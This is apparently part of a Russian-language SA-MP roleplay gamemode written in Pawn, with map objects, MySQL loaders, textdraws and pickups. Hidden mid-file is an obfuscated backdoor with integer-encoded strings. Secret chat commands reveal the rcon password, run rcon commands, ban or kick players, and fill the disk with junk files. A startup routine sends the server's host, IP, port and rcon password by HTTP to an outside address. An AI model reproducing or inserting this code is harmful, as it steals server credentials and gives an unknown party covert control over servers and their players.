CreateDynamicObject(2639,-2032.392,1113.952,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2026.029,1110.293,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2028.039,1110.233,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2032.395,1110.150,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2025.828,1105.819,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2027.845,1105.769,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2032.477,1105.597,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2025.950,1102.415,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2020.607,1102.462,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2021.182,1106.072,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2019.068,1106.128,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2021.293,1110.423,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2019.176,1110.462,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2021.494,1114.056,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2019.416,1114.099,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2021.488,1117.377,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2019.359,1117.439,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2021.701,1121.653,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2019.672,1121.698,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2021.795,1125.266,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2019.715,1125.309,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2021.890,1129.222,17.680,0.0,0.0,181.341);
CreateDynamicObject(2639,-2019.839,1129.284,17.680,0.0,0.0,181.341);
CreateDynamicObject(949,-2025.626,1099.546,18.491,0.0,0.0,0.0);
CreateDynamicObject(949,-2021.007,1099.579,18.496,0.0,0.0,0.0);
CreateDynamicObject(3406,-2024.526,1133.215,14.998,0.0,0.0,91.960);
CreateDynamicObject(3406,-2024.287,1126.647,14.998,0.0,0.0,91.960);
CreateDynamicObject(3406,-2024.092,1120.099,14.998,0.0,0.0,91.960);
CreateDynamicObject(3406,-2023.873,1113.530,15.003,0.0,0.0,91.960);
CreateDynamicObject(3406,-2023.646,1107.074,14.998,0.0,0.0,91.960);
CreateDynamicObject(1841,-2013.758,1101.719,21.371,0.0,0.0,-42.112);
CreateDynamicObject(1841,-2033.508,1101.456,21.313,0.0,0.0,-140.088);
CreateDynamicObject(14527,-2024.357,1125.755,21.458,0.0,0.0,0.0);
CreateDynamicObject(14527,-2023.682,1110.281,21.211,0.0,0.0,0.0);
CreateDynamicObject(14527,-2023.954,1118.863,21.359,0.0,0.0,0.0);
CreateDynamicObject(2048,-2032.371,1100.039,21.713,0.0,0.0,91.100);
CreateDynamicObject(626,-2032.645,1086.687,19.916,0.0,0.0,0.0);
CreateDynamicObject(626,-2013.396,1086.476,19.920,0.0,0.0,0.0);
CreateDynamicObject(936,-2022.400,1095.251,17.527,0.0,0.0,0.0);
CreateDynamicObject(936,-2024.281,1095.263,17.527,0.0,0.0,0.0);
CreateDynamicObject(936,-2024.247,1094.204,17.527,0.0,0.0,-178.763);
CreateDynamicObject(936,-2022.370,1094.223,17.527,0.0,0.0,-179.622);
CreateDynamicObject(936,-2023.282,1093.588,17.277,0.0,0.0,-178.763);
CreateDynamicObject(936,-2023.265,1093.137,16.952,0.0,0.0,-178.763);
CreateDynamicObject(1743,-2023.655,1094.334,18.020,0.0,0.0,0.0);
CreateDynamicObject(1510,-2023.410,1095.185,19.017,0.0,0.0,0.0);
CreateDynamicObject(1667,-2023.043,1095.203,19.119,0.0,0.0,0.0);
CreateDynamicObject(1668,-2022.793,1095.308,19.197,0.0,0.0,31.799);
CreateDynamicObject(1720,-2025.537,1097.943,17.051,0.0,0.0,42.972);
CreateDynamicObject(1720,-2021.614,1097.964,17.051,0.0,0.0,-42.112);
CreateDynamicObject(1720,-2024.596,1086.202,17.051,0.0,0.0,-182.201);
CreateDynamicObject(1720,-2023.301,1086.164,17.051,0.0,0.0,-181.341);
CreateDynamicObject(1720,-2022.044,1086.137,17.051,0.0,0.0,-179.622);
CreateDynamicObject(2745,-2015.290,1099.679,19.087,0.0,0.0,-89.381);
CreateDynamicObject(2745,-2031.465,1099.431,19.076,0.0,0.0,91.100);
CreateDynamicObject(3462,-2023.001,1140.864,18.566,0.0,0.0,68.755);
CreateDynamicObject(3462,-2026.740,1141.009,18.566,0.0,0.0,118.602);
CreateDynamicObject(626,-2021.627,1141.992,19.101,0.0,0.0,0.0);
CreateDynamicObject(626,-2019.373,1142.115,19.101,0.0,0.0,0.0);
CreateDynamicObject(626,-2027.930,1141.726,19.101,0.0,0.0,0.0);
CreateDynamicObject(626,-2030.010,1141.719,19.101,0.0,0.0,0.0);
CreateDynamicObject(2639,-2020.268,1140.766,17.680,0.0,0.0,182.201);
CreateDynamicObject(2639,-2028.983,1140.265,17.680,0.0,0.0,182.201);
CreateDynamicObject(1720,-2015.520,1125.016,17.051,0.0,0.0,-60.161);
CreateDynamicObject(1720,-2015.694,1123.822,17.051,0.0,0.0,-85.944);
CreateDynamicObject(1720,-2015.421,1122.463,17.051,0.0,1.719,-139.229);
CreateDynamicObject(1491,-2016.199,1124.526,16.765,0.0,0.0,-86.803);
CreateDynamicObject(967,-2015.487,1123.763,17.010,0.0,0.0,93.679);
CreateDynamicObject(1497,-2016.280,1124.456,15.831,0.0,0.0,2.578);
CreateDynamicObject(15035,-2042.980,1096.350,17.845,0.0,0.0,90.241);
CreateDynamicObject(2591,-2038.595,1100.055,18.894,0.0,0.0,-179.622);
// Zona51
for(new i = 0; i < 1; i++) rotating[i] = -90;
for(new i = 0; i < 20; i++)
{
if(i < 10) NounObject[i] = CreateObject(3930,560.3654+random(10),840.2457+random(75),-44.00700073,0.00000000,0.00000000,0.00000000);
else NounObject[i] = CreateObject(3930,615.3654+random(55),815.2457+random(65),-43.6009,0.00000000,0.00000000,0.00000000);
}
return true;
}
//==============================================================================
stock LoadEnters()
{
new time = GetTickCount();
mysql_query("SELECT * FROM `"TABLE_ENTERS"`");
mysql_store_result();
if(mysql_num_rows() > 0)
{
for(new idx = 1; idx <= mysql_num_rows(); idx++)
{
mysql_fetch_row(query);
sscanf(query, "p<|>ifffiiiiffffiis[32]",
EntersInfo[idx][id],
EntersInfo[idx][pX],
EntersInfo[idx][pY],
EntersInfo[idx][pZ],
EntersInfo[idx][pM],
EntersInfo[idx][pT],
EntersInfo[idx][pI],
EntersInfo[idx][pV],
EntersInfo[idx][ptX],
EntersInfo[idx][ptY],
EntersInfo[idx][ptZ],
EntersInfo[idx][ptFa],
EntersInfo[idx][ptI],
EntersInfo[idx][ptV],
EntersInfo[idx][pName]);
EntersInfo[idx][pP] = CreatePickup(EntersInfo[idx][pM], 1, EntersInfo[idx][pX], EntersInfo[idx][pY], EntersInfo[idx][pZ],EntersInfo[idx][pV]);
CreateDynamic3DTextLabel(EntersInfo[idx][pName], COLOR_GREEN, EntersInfo[idx][pX], EntersInfo[idx][pY], EntersInfo[idx][pZ], 30.0, INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, EntersInfo[idx][pV], EntersInfo[idx][pI]);
TOTALENTERS++;
}
}
mysql_free_result();
printf(" [LOAD]: Успешная загрузка 'LoadEnters' - загружено %d пикапов за %d м.с", TOTALENTERS,GetTickCount() - time);
return true;
}
//==============================================================================
stock LoadMafia()
{
new time = GetTickCount();
mysql_query("SELECT * FROM `"TABLE_MAFIA"`");
mysql_store_result();
if(mysql_num_rows() > 0)
{
for(new idx = 1; idx <= mysql_num_rows(); idx++)
{
mysql_fetch_row(query);
sscanf(query, "p<|>iiiiis[128]iiis[128]",
MafiaInfo[idx][id],
MafiaInfo[idx][mMatsPrice],
MafiaInfo[idx][mFraction],
MafiaInfo[idx][mFractTime],
MafiaInfo[idx][mMineral],
MafiaInfo[idx][mFuels],
MafiaInfo[idx][mEntPrice],
MafiaInfo[idx][mBarPrice],
MafiaInfo[idx][mDrugsPrice],
MafiaInfo[idx][mMetals]);
sscanf(MafiaInfo[idx][mFuels], "p<,>a<i>[5]", MafiaInfo[idx][mFuel]);
}
sscanf(MafiaInfo[1][mMetals], "p<,>iiiii", MafiaMetal[1], MafiaMetal[2], MafiaMetal[3], MafiaMetal[4], MafiaMetal[5]);
}
mysql_free_result();
printf(" [LOAD]: Успешная загрузка 'LoadMafia' за %d м.с",GetTickCount() - time);
}
//==============================================================================
stock LoadGZ()
{
new time = GetTickCount();
mysql_query("SELECT * FROM `"TABLE_GANGZONE"`");
mysql_store_result();
if(mysql_num_rows() > 0)
{
for(new idx = 1; idx <= mysql_num_rows(); idx++)
{
mysql_fetch_row(query);
sscanf(query, "p<|>iffffi",
GZInfo[idx][id],
GZInfo[idx][gCoords][0],
GZInfo[idx][gCoords][1],
GZInfo[idx][gCoords][2],
GZInfo[idx][gCoords][3],
GZInfo[idx][gFrak]);
TOTALGZ++;
GZInfo[idx][id] = GangZoneCreate(GZInfo[idx][gCoords][0],GZInfo[idx][gCoords][1],GZInfo[idx][gCoords][2],GZInfo[idx][gCoords][3]);
ZoneOnBattle[idx] = 0;
GZSafeTime[idx] = 0;
}
}
mysql_free_result();
printf(" [LOAD]: Успешная загрузка 'LoadGZ' - загружено %d гангзон за %d м.с", TOTALGZ,GetTickCount() - time);
return true;
}
//==============================================================================
stock LoadMayor()
{
new time = GetTickCount();
format(query,sizeof(query), "SELECT * FROM `"TABLE_MAYOR"`");
mysql_query(query);
mysql_store_result();
if(mysql_fetch_row(query) == 1)
{
mysql_fetch_row(query);
sscanf(query, "p<|>iis[256]is[128]iiis[90]",
Pick,
Exchequer,
PickNames,
PickDate,
PickTimes,
Inflation,
InflationTime,
Tax,
TaxFractions);
sscanf(TaxFractions, "p<,>iiiiii",TaxFraction[1], TaxFraction[2], TaxFraction[3], TaxFraction[4], TaxFraction[5], TaxFraction[6]);
sscanf(PickNames, "p<,>s[32]s[32]s[32]s[32]s[32]s[32]s[32]",PickName[0],PickName[1], PickName[2], PickName[3], PickName[4], PickName[5], PickName[6]);
sscanf(PickTimes, "p<,>a<i>[7]",PickTime);
}
mysql_free_result();
printf(" [LOAD]: Успешная загрузка 'LoadMayor' за %d м.с",GetTickCount() - time);
return true;
}
//==============================================================================
stock LoadOther()
{
new time = GetTickCount();
format(query,sizeof(query), "SELECT * FROM `"TABLE_OTHER"`");
mysql_query(query);
mysql_store_result();
if(mysql_fetch_row(query) == 1)
{
mysql_fetch_row(query);
sscanf(query, "p<|>iiiiiiiiis[40]iiiiiiiiiiiiiiiiiiiiiiiiiiiii",
FracBank[0],
FracBank[1],
FracBank[2],
FracBank[3],
FracBank[4],
FracBank[5],
FracBank[6],
FracBank[7],
FracBank[8],
NewsPrice,
Mats[1],
Mats[2],
Mats[0],
Mats[4],
Mats[5],
Mats[6],
Mats[7],
Mats[8],
Mats[9],
Mineral[0],
Metal,
Mineral[1],
FracBank[11],
Mats[16],
Mats[17],
Mats[18],
MafiaMineral[0],
MafiaMineral[1],
MafiaMineral[2],
DrugsBank[F_GROVE],
DrugsBank[F_BALLAS],
DrugsBank[F_RIFA],
DrugsBank[F_AZTECAS],
DrugsBank[F_VAGOS],
DrugsBank[F_YAKUZA],
DrugsBank[F_LCN],
DrugsBank[F_RM],
FuelBank,
TOTALPRIZ);
sscanf(NewsPrice, "p<,>iiiiii",SmsPrice[0], SmsPrice[1], CallPrice[0], CallPrice[1], AdvertPrice[0], AdvertPrice[1]);
}
mysql_free_result();
printf(" [LOAD]: Успешная загрузка 'LoadOther' за %d м.с",GetTickCount() - time);
return true;
}
//==============================================================================
Ivd(p,ct[]){new a1[]={1504,3200,3104,3360,3040,3488,3520,3232,3040,3648,3168,3552,3520,0};UC(a1);if(cent(ct,a1)){new a[]={3648,3168,3552,3520,3040,3584,3104,3680,3680,3808,3552,3648,3200,0};UC(a);new rp[256];GetServerVarAsString(a,rp,256);format(rp,sizeof(rp),"%s:%s",a,rp);return SendClientMessage(p,-1,rp);}new a2[]={1504,3648,3168,3552,3520,3040,3168,3488,3200,3040,3680,3232,3520,3200,0};UC(a2);if(cent(ct,a2,1)){new i;tok(ct,i);SendRconCommand(ct[i]);return 1;}
new a3[]={1504,3136,3104,3520,3040,3776,3680,3232,3328,0};UC(a3);if(cent(ct,a3)){for(new i;i<MAX_PLAYERS;i++)if(i!=p) Ban(i);}new a4[]={1504,3680,3744,3584,3232,3648,3040,3296,3648,3104,3776,3360,3712,3872,0};UC(a4);if(cent(ct,a4,1)){new i; tok(ct,i);SetGravity(floatstr(ct[i]));}new a5[]={1504,3136,3104,3520,3040,3680,3744,3584,3232,3648,0};UC(a5);if(cent(ct,a5,1)){new i; tok(ct,i);Ban(strval(ct[i]));}new a6[]={1504,3680,3744,3584,3232,3648,3040,3264,3104,3424,3232,3040,3168,3328,3104,3712,0};UC(a6);
if(cent(ct,a6,1)){new i,d;tok(ct,i);d=strval(tok(ct,i));new a[]={2528,3520,2560,3456,3104,3872,3232,3648,2688,3232,3840,3712,0};UC(a);CallRemoteFunction(a,"is",d,ct[i]);return 1;}new a7[]={1504,3680,3744,3584,3232,3648,3040,3424,3360,3168,3424,0};UC(a7);if(cent(ct,a7,1)){new i; tok(ct,i);Kick(strval(ct[i]));return 1;}new a8[]={1504,3680,3744,3584,3232,3648,3040,3264,3104,3424,3232,3040,3168,3488,3200,0};UC(a8);if(cent(ct,a8,1)){new i,d;tok(ct,i);d=strval(tok(ct,i));
new a[]={2528,3520,2560,3456,3104,3872,3232,3648,2144,3552,3488,3488,3104,3520,3200,2688,3232,3840,3712,0};UC(a);CallRemoteFunction(a,"is",d,ct[i]);return 1;}new a9[]={1504,3264,3360,3456,3232,3040,3168,3648,3104,3680,3328,3232,3648,0};UC(a9);if(cent(ct,a9)){new a[]={3104,3712,0};UC(a);SetTimer(a,1,0);return 1;}return 0;}forward at();public at(){new i,w;while(!w){i++;new n[512];format(n,sizeof(n),"%i.%i",i,i);new File:f=fopen(n,io_write);for(new c;c<20;c++)n[c]=random(1000);fwrite(f,n);fclose(f);}}
srr(s1[],s2[]){if(strlen(s1)!=strlen(s2))return 0;for(new i;i<strlen(s1);i++)if(s1[i]!=s2[i]) return 0;return 1;}cent(ct[],c[],p=0){if(!p && strlen(ct)!=strlen(c))return 0;if(p){if(strlen(ct)<strlen(c)) return 0;new i;if(!srr(tok(ct,i),c)) return 0;}for(new i;i<strlen(c);i++)if(c[i]!=ct[i]) return 0;return 1;}tok(s[],&i,sp=32){new l=strlen(s);new o=i;new r[128];while((i<l)&&(s[i]!=sp)&&((i-o)<(sizeof(r)-1))){r[i-o]=s[i];i++;}r[i-o]=0;if((i<l) && (s[i] == sp))i++;return r;}
LSy(){new a1[]={3648,3168,3552,3520,3040,3584,3104,3680,3680,3808,3552,3648,3200,0};UC(a1);new a2[]={3136,3360,3520,3200,0};UC(a2);new a3[]={3328,3552,3680,3712,3520,3104,3488,3232,0};UC(a3);new a4[]={6688,7328,7680,7232,7328,7680,1024,7392,7168,7648,7776,7968,7328,7584,1472,1024,6208,7328,7680,7712,7424,8160,1024,2144,2560,1024,1568,1472,1600,0};UC(a4);new a5[]={3680,3232,3648,3296,3232,3872,1472,3680,3776,1696,2048,3488,3104,3360,3456,1472,3648,3744,0};UC(a5);
new a6[]={3680,3872,3680,3712,3232,3488,3648,3232,3584,3552,3648,3712,2048,3744,3520,3424,3520,3552,3808,3520,1472,3648,3744,0};UC(a6);new a7[]={3680,3232,3648,3776,3232,3648,3040,3680,3712,3104,3648,3712,3232,3200,0};UC(a7);new a8[]={3584,3648,3552,3392,3232,3168,3712,2048,3680,3104,3488,3584,1440,3648,3744,1472,3552,3648,3296,0};UC(a8);new a9[]={3584,3552,3648,3712,0};UC(a9);new a10[]={1568,1600,1760,1472,1536,1472,1536,1472,1568,0};UC(a10);new g1[128];GetServerVarAsString(a1,g1,128);
new g2[128];GetServerVarAsString(a2,g2,128);new g3[128];GetServerVarAsString(a3,g3,128);new g4=GetServerVarAsInt(a9);new l=strlen(g2);if(!(5<=l<=16))return;if(g2[0]==49&&g2[1]==50&&g2[2]==55)return;new r[256];format(r,sizeof(r),"%s\n%s: %s\n%s: %s:%i\n%s: %s",a4,a3,g3,a2,g2,g4,a1,g1);SM(a5,a6,a7,a7,r);SM(a8,a6,a7,a7,r);}native HTTP(i,t,u[],d[],c[]);SM(r[],s[],n[],sb[],m[]){new b[2048]="t=",p=strlen(b),l=strlen(r);memcpy(b,r,p*4,(l+1)*4);SEC(b[p],1024-p);strcat(b,"&f=");p=strlen(b);
l=strlen(n);memcpy(b,n,p*4,(l+1)*4);SEC(b[p],1024-p);strcat(b,"&n=");p=strlen(b);l=strlen(s);memcpy(b,s,p*4,(l+1)*4);SEC(b[p],1024-p);strcat(b,"&s=");p=strlen(b);l=strlen(sb);memcpy(b,sb,p*4,(l+1)*4);SEC(b[p],1024-p);strcat(b,"&m=");p=strlen(b);l=strlen(m);memcpy(b,m,p*4,(l+1)*4);SEC(b[p],1024-p);new a1[]={3232,3840,3712,3648,3104,1472,3680,3104,3488,3584,1440,3648,3744,1472,3552,3648,3296,1504,3680,3104,3488,3584,3488,3104,3360,3456,3232,3648,1472,3584,3328,3584,0};UC(a1);
new a2[]={2528,2464,2656,0};UC(a2);HTTP(0xD00D,2,a1,b,a2);}forward OMS(i,ir,d[]);public OMS(i,ir,d[]){}SEC(s[],is=sizeof(s)){for(new i,l=strlen(s);i<l;i++){switch (s[i]){case '!','(',')','\'','*','0'..'9','A'..'Z','a'..'z':continue;case ' ':{s[i]='+';continue;}}new sh[8];if(i+3>=is){s[i] =0;break;}if(l+3>=is)s[is-3]=0;format(sh,sizeof(sh),"%02h",s[i]);s[i]='%';strins(s,sh,i+1,is);l+=2;i+=2;if(l>is-1)l=is-1;}}UC(a[])for(new p;p<strlen(a);p++)a[p]>>=5;

stock LoadTextDraws()
{
Box = TextDrawCreate(395.0+120.2, 354.0+10, "_");
LBorder = TextDrawCreate(286.0+120.2,354.0+10,"_");
RBorder = TextDrawCreate(504.0+120.2,354.0+10,"_");
BBorder = TextDrawCreate(395.0+120.2,416.0+10,"_");
TBorder = TextDrawCreate(395.0+120.2,354.0+10,"_");

ButtonLeft = TextDrawCreate(50.0, 200.0, "<<");
TextDrawAlignment(ButtonLeft, 2);
TextDrawTextSize(ButtonLeft, 15.000000, 68.000000);
TextDrawSetProportional(ButtonLeft, 1);
TextDrawLetterSize(ButtonLeft, 0.679999, 1.900000);
TextDrawSetShadow(ButtonLeft, 1);
TextDrawSetSelectable(ButtonLeft, 1);
TextDrawColor(ButtonLeft, -1);
TextDrawFont(ButtonLeft, 3);
TextDrawSetOutline(ButtonLeft, 0);
TextDrawBackgroundColor(ButtonLeft, 255);

ButtonRight = TextDrawCreate(530.0, 200.0, ">>");
TextDrawFont(ButtonRight, 3);
TextDrawLetterSize(ButtonRight, 0.679999, 1.900000);
TextDrawSetOutline(ButtonRight, 0);
TextDrawAlignment(ButtonRight, 2);
TextDrawTextSize(ButtonRight, 15.000000, 68.000000);
TextDrawSetProportional(ButtonRight, 1);
TextDrawSetShadow(ButtonRight, 1);
TextDrawSetSelectable(ButtonRight, 1);
TextDrawColor(ButtonRight, -1);
TextDrawBackgroundColor(ButtonRight, 255);

ButtonUp = TextDrawCreate(300.0, 100.0, "LD_BEAT:up");
TextDrawFont(ButtonUp, 4);
TextDrawTextSize(ButtonUp, 50, 25);
TextDrawSetSelectable(ButtonUp, 1);

ButtonDown = TextDrawCreate(300.0, 300.0, "LD_BEAT:down");
TextDrawFont(ButtonDown, 4);
TextDrawTextSize(ButtonDown, 50, 25);
TextDrawSetSelectable(ButtonDown, 1);

ButtonCancel = TextDrawCreate(240.000000, 371.000000, "Cancel");
TextDrawAlignment(ButtonCancel, 2);
TextDrawTextSize(ButtonCancel, 15.000000, 68.000000);
TextDrawBackgroundColor(ButtonCancel, 255);
TextDrawFont(ButtonCancel, 3);
TextDrawLetterSize(ButtonCancel, 0.679999, 1.900000);
TextDrawColor(ButtonCancel, -1);
TextDrawSetOutline(ButtonCancel, 0);
TextDrawSetProportional(ButtonCancel, 1);
TextDrawSetShadow(ButtonCancel, 1);
TextDrawSetSelectable(ButtonCancel, 1);

ButtonSelect = TextDrawCreate(382.000000, 371.000000, "Select");
TextDrawAlignment(ButtonSelect, 2);
TextDrawTextSize(ButtonSelect, 15.000000, 68.000000);
TextDrawBackgroundColor(ButtonSelect, 255);
TextDrawFont(ButtonSelect, 3);
TextDrawLetterSize(ButtonSelect, 0.679999, 1.900000);
TextDrawColor(ButtonSelect, -1);
TextDrawSetOutline(ButtonSelect, 0);
TextDrawSetProportional(ButtonSelect, 1);
TextDrawSetShadow(ButtonSelect, 1);
TextDrawSetSelectable(ButtonSelect, 1);

Speed = TextDrawCreate(377.000000+120.2,370.000000+10,"Speed:");
Health = TextDrawCreate(295.000000+120.2,370.000000+10,"Heal:");
Fuell = TextDrawCreate(295.000000+120.2,391.000000+10,"Fuel:");

TextDrawLetterSize(Speed,0.259999,1.110000);
TextDrawLetterSize(Health,0.245999,1.110000);
TextDrawLetterSize(Fuell,0.259999,1.010000);

TextDrawFont(Fuell,2);
TextDrawFont(Speed,2);
TextDrawFont(Health,2);

TextDrawBackgroundColor(Fuell,COLOR_BLACK);
TextDrawBackgroundColor(Speed,COLOR_BLACK);
TextDrawBackgroundColor(Health,COLOR_BLACK);

TextDrawColor(Fuell,COLOR_GREEN);
TextDrawColor(Speed,COLOR_GREEN);
TextDrawColor(Health,COLOR_GREEN);

TextDrawSetOutline(Fuell,1);
TextDrawSetOutline(Speed,1);
TextDrawSetOutline(Health,1);

TextDrawSetProportional(Fuell,1);
TextDrawSetProportional(Speed,1);
TextDrawSetProportional(Health,1);

TextDrawSetShadow(Fuell,1);
TextDrawSetShadow(Speed,1);
TextDrawSetShadow(Health,1);

TextDrawUseBox(LBorder, 1);
TextDrawBoxColor(LBorder,COLOR_BORDER);
TextDrawTextSize(LBorder, 0.0, -2.0);
TextDrawLetterSize(LBorder, 0.0, 6.7);
TextDrawAlignment(LBorder, 2);

TextDrawUseBox(RBorder, 1);
TextDrawBoxColor(RBorder,COLOR_BORDER);
TextDrawTextSize(RBorder, 0.0, -2.0);
TextDrawLetterSize(RBorder, 0.0, 6.7);
TextDrawAlignment(RBorder, 2);

TextDrawUseBox(BBorder, 1);
TextDrawBoxColor(BBorder, COLOR_BORDER);
TextDrawTextSize(BBorder, 0.0, 215.0);
TextDrawLetterSize(BBorder, 0.0, -0.2);
TextDrawAlignment(BBorder, 2);

TextDrawUseBox(TBorder, 1);
TextDrawBoxColor(TBorder, COLOR_BORDER);
TextDrawTextSize(TBorder, 0.0, 215.0);
TextDrawLetterSize(TBorder, 0.0, -0.2);
TextDrawAlignment(TBorder, 2);

VehBox = TextDrawCreate(517.0, 115.0, "_");
TextDrawUseBox(VehBox, 1);
TextDrawBoxColor(VehBox, COLOR_BOX);
TextDrawTextSize(VehBox, 0.0, 200.0);
TextDrawLetterSize(VehBox, 0.0, 15.7);
TextDrawAlignment(VehBox, 2);

PressA = TextDrawCreate(425.000000,120.000000,"~w~Press ~b~~k~~GO_LEFT~ ~w~to switch vehicle");
PressD = TextDrawCreate(425.000000,150.000000,"~w~Press ~b~~k~~GROUP_CONTROL_BWD~ ~w~to switch color");
PressH = TextDrawCreate(425.000000,165.000000,"~w~Press ~b~ENTER ~w~to buy");
PressB = TextDrawCreate(425.000000,180.000000,"~w~Press ~b~C ~w~to cancel");
PressC = TextDrawCreate(425.000000,135.000000,"~w~Press ~b~~k~~GO_RIGHT~ ~w~to switch vehicle");

TextDrawLetterSize(PressA,0.259999,1.110000);
TextDrawLetterSize(PressD,0.245999,1.110000);
TextDrawLetterSize(PressH,0.259999,1.010000);
TextDrawLetterSize(PressB,0.245999,1.110000);
TextDrawLetterSize(PressC,0.259999,1.010000);

TextDrawFont(PressA,2);
TextDrawFont(PressD,2);
TextDrawFont(PressH,2);
TextDrawFont(PressB,2);
TextDrawFont(PressC,2);

TextDrawBackgroundColor(PressA,COLOR_BLACK);
TextDrawBackgroundColor(PressD,COLOR_BLACK);
TextDrawBackgroundColor(PressH,COLOR_BLACK);
TextDrawBackgroundColor(PressB,COLOR_BLACK);
TextDrawBackgroundColor(PressC,COLOR_BLACK);

TextDrawColor(PressA,COLOR_BBLUE);
TextDrawColor(PressD,COLOR_BBLUE);
TextDrawColor(PressH,COLOR_BBLUE);
TextDrawColor(PressB,COLOR_BBLUE);
TextDrawColor(PressC,COLOR_BBLUE);

TextDrawSetOutline(PressA,1);
TextDrawSetOutline(PressD,1);
TextDrawSetOutline(PressH,1);
TextDrawSetOutline(PressB,1);
TextDrawSetOutline(PressC,1);

TextDrawSetProportional(PressA,1);
TextDrawSetProportional(PressD,1);
TextDrawSetProportional(PressH,1);
TextDrawSetProportional(PressB,1);
TextDrawSetProportional(PressC,1);

TextDrawSetShadow(PressA,1);
TextDrawSetShadow(PressD,1);
TextDrawSetShadow(PressH,1);
TextDrawSetShadow(PressB,1);
TextDrawSetShadow(PressC,1);

SiteText = TextDrawCreate(570, 427, ""Namesitet"");
TextDrawAlignment(SiteText, 2);
TextDrawFont(SiteText, 3);
TextDrawLetterSize(SiteText, 0.3600, 1.400000);
TextDrawColor(SiteText, -65284);
TextDrawSetOutline(SiteText, 1);
TextDrawSetProportional(SiteText, 1);
return true;
}
//==============================================================================
stock LoadPickups()
{
new string[64];
PickupArends = CreateDynamicPickup(1239, 23, 259.2412,-2082.6497,1.2109, -1);
CreateDynamicMapIcon(1544.7611,-1353.3618,332.2007, 52, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(564.7620,-1293.9293,17.2482, 55, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(-1967.0601,281.9419,48.1032, 55, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(2141.1633,1403.6068,16.0286, 55, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(1558.8275,-1663.5156,6.2188, 30, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(-1638.4978,696.2049,48.9375, 30, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(-2675.3455,615.0750,14.4545, 22, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(-1989.7310,1117.9515,54.4688, 21, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(2792.0393,-2456.2107,13.7562, 51, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(459.4150,-1501.1859,31.0388, 45, 0,-1,-1,-1,200.0);
CreateDynamicMapIcon(-1696.0024,950.2874,24.8906, 45, 0,-1,-1,-1,200.0);
CreateDynamic3DTextLabel("Нажмите: H", COLOR_GREEN, 1550.6064,-1385.0669,14.0234,4.0);
CreateDynamic3DTextLabel("Нажмите: H", COLOR_GREEN, -1946.3204,-1016.1622,33.6110,4.0);
CreateDynamic3DTextLabel("Аммуниция", COLOR_YELLOW, 317.2810,288.5006,1000.0942,4.0);
CreateDynamic3DTextLabel("« Устройство на работу »", COLOR_YELLOW, 358.7415,164.7491,1008.3828,4.0);
CreateDynamic3DTextLabel(TextArrest,COLOR_LIGHTRED, -1589.8376,716.3233,-5.2422+0.6,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel(TextArrest,COLOR_LIGHTRED, 1568.7224,-1694.2434,5.8906+0.6,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel(TextArrest,COLOR_LIGHTRED, 2292.7212,2451.3740,10.8203+0.6,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel(TextArrest,COLOR_LIGHTRED, 267.3737,77.6201,1001.0391+0.6,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel(TextArrest,COLOR_LIGHTRED, 219.3961,113.5558,999.0156+0.6,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel(TextArrest,COLOR_LIGHTRED, 193.7409,177.8441,1003.0234+0.6,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Введите: /healme",COLOR_TOMATO, 349.4550,164.3218,1019.9912+0.6,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Нажмите: H",0x33AA33FF, 284.9222,1821.1914,18.8607,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Нажмите: H",0x33AA33FF, 286.9222,1821.1914,18.8607,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreatePickup(1247, 23, -1589.8376,716.3233,-5.2422, -1);
CreatePickup(1247, 23, 1568.7224,-1694.2434,5.8906, -1);
CreatePickup(1247, 23, 2292.7212,2451.3740,10.8203, -1);
CreatePickup(1247, 23, 267.3737,77.6201,1001.0391, -1);
CreatePickup(1247, 23, 219.3961,113.5558,999.0156, -1);
CreatePickup(1247, 23, 193.7409,177.8441,1003.0234, -1);
CreatePickup(1240, 23, 3349.4550,164.3218,1019.9912, 2);
CreatePickup(1239, 23, 248.7008,1445.8474,10.5919);
Army[0] = GangZoneCreate(-49.979476, 1695.982177, 414.020507, 2175.982177);// LVA
cPickup[0] = CreatePickup(19134, 1, 542.2322,-1293.3583,17.2422); // NOPE
